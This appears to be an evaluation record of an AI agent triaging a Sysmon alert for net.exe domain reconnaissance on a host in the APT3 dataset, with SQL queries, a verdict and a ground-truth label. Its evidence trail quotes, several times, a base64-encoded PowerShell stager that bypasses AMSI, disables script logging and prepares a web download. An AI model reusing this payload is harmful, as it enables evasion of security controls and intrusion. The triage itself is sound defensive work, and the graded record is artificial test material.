  {
    "model": "gemma4:12b-it-q8_0",
    "dataset": "apt3",
    "rule": "discovery_net_recon",
    "title": "Net.exe Domain Reconnaissance",
    "timestamp": "2019-05-14T22:47:16.722Z",
    "computer": "HR001.shire.com",
    "image": "C:\\Windows\\System32\\net.exe",
    "command_line": "\"C:\\Windows\\system32\\net.exe\" group \"Domain Computers\" /domain",
    "event_id": "1",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "triage": {
      "summary": "A malicious PowerShell script was executed by user SHIRE\\nmartha on HR001.shire.com. The script contained heavily obfuscated code designed to bypass the Antimalware Scan Interface (AMSI) and disable PowerShell ScriptBlock Logging by modifying registry keys. Following this evasion activity, the script spawned net.exe to perform domain reconnaissance by listing members of the 'Domain Computers' group.",
      "technique": "T1059.001",
      "technique_name": "PowerShell",
      "confidence": 0.95,
      "disposition": "malicious_true_positive",
      "reasoning": "The decoded Base64 payload in the ParentCommandLine of the net.exe execution explicitly shows attempts to set 'EnableScriptBlockLogging' to 0 in the registry and references 'AmsiUtils' for AMSI bypass. These are high-confidence indicators of malicious activity intended to evade security controls before performing discovery.",
      "scope": {
        "systems": [
          "HR001.shire.com"
        ],
        "users": [
          "SHIRE\\nmartha"
        ],
        "data": "Domain Computer group information, PowerShell Registry configurations",
        "timeframe": "2019-05-14T22:30:00Z to 2019-05-14T23:00:00Z"
      },
      "escalate": true,
      "escalation_rationale": "The activity involves active evasion techniques (AMSI bypass and disabling security logs) followed by internal reconnaissance. This indicates a high likelihood of an active compromise or post-exploitation phase.",
      "recommended_actions": [
        "Isolate host HR001.shire.com from the network.",
        "Reset credentials for user SHIRE\\nmartha.",
        "Conduct a full forensic sweep of HR001.shire.com to identify any persistence mechanisms or additional payloads downloaded via the WebClient object used in the script.",
        "Check for other hosts where the same PowerShell command or registry modifications were observed."
      ],
      "queries_run": [
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Image LIKE '%net.exe%' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE User LIKE '%SHIRE\\martha%' AND Computer LIKE '%HR001.shire.com%' AND TimeCreated BETWEEN '2019-05-14T22:06:56.596Z' AND '2019-05-14T23:06:56.596Z' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE User LIKE '%SHIRE\\martha%' AND Computer LIKE '%HR001.shire.com%' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T23:00:00Z' AND Image LIKE '%powershell.exe%' LIMIT 20;",
        "SELECT User, ParentImage, TimeCreated, Computer, Image, CommandLine, ParentCommandLine FROM logs WHERE Image LIKE '%net.exe%' AND CommandLine LIKE '%group \"Domain Computers\" /domain%' AND TimeCreated = '2019-05-14T22:47:16.722Z' AND Computer = 'HR001.shire.com' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine, EventID, IpAddress FROM logs WHERE Image LIKE '%powershell.exe%' AND Computer = 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:50:00Z' AND EventID = 3 LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE EventID = 4104 AND User = 'SHIRE\\nmartha' AND Computer = 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T23:00:00Z' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE EventID = 4104 AND User = 'SHIRE\\nmartha' AND Computer = 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T23:00:00Z' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Image LIKE '%net.exe%' AND TimeCreated = '2019-05-14T22:47:16.722Z' LIMIT 20;"
      ]
    },
    "fallback_used": false,
    "fallback_reason": null,
    "ground_truth_verdict": "bad",
    "evidence_trail": [
      {
        "question": "What was the user account that executed this command and what was the parent process of net.exe?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:36:56.596Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" start\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlA \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "What other processes were executed by the user SHIRE\\martha on HR001.shire.com within 30 minutes before and after 2019-05-14T22:36:56.596Z?",
        "evidence": "No matching records found for: What other processes were executed by the user SHIRE\\martha on HR001.shire.com within 30 minutes before and after 2019-05-14T22:36:56.596Z?"
      },
      {
        "question": "What were the PowerShell script blocks executed by SHIRE\\martha on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T23:00:00Z?",
        "evidence": "No matching records found for: What were the PowerShell script blocks executed by SHIRE\\martha on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T23:00:00Z?"
      },
      {
        "question": "What was the user account and parent process for the \"net.exe\" group \"Domain Computers\" /domain command executed at 2019-05-14T22:47:16.722Z on HR001.shire.com?",
        "evidence": "1 record(s):\n[{\"User\": \"SHIRE\\\\nmartha\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"TimeCreated\": \"2019-05-14T22:47:16.722Z\", \"Computer\": \"HR001.shire.com\", \"Image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" group \\\"Domain Computers\\\" /domain\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQA \u2026[truncated \u2014 ask for fewer columns or rows]"
      },
      {
        "question": "What network connections were established by powershell.exe on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T22:50:00Z?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:32:36.244Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:37.705Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:39.896Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:45.333Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:50.536Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:55.758Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:00.693Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:05.833Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:11.036Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:15.974Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:21.177Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:26.114Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:31.333Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:36.286Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"3\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:33:41.442Z\", \"Computer\": \"HR001.sh \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "What are the PowerShell script block logs (Event ID 4104) for user SHIRE\\nmartha on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T23:00:00Z?",
        "evidence": "No matching records found for: What are the PowerShell script block logs (Event ID 4104) for user SHIRE\\nmartha on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T23:00:00Z?"
      },
      {
        "question": "What are the PowerShell script block logs (Event ID 4104) for user SHIRE\\nmartha on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T23:00:00Z?",
        "evidence": "No matching records found for: What are the PowerShell script block logs (Event ID 4104) for user SHIRE\\nmartha on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T23:00:00Z?"
      },
      {
        "question": "Can you provide the decoded content of the Base64 string found in the ParentCommandLine of the net.exe execution at 2019-05-14T22:47:16.722Z?",
        "evidence": "1 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:47:16.722Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" group \\\"Domain Computers\\\" /domain\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbw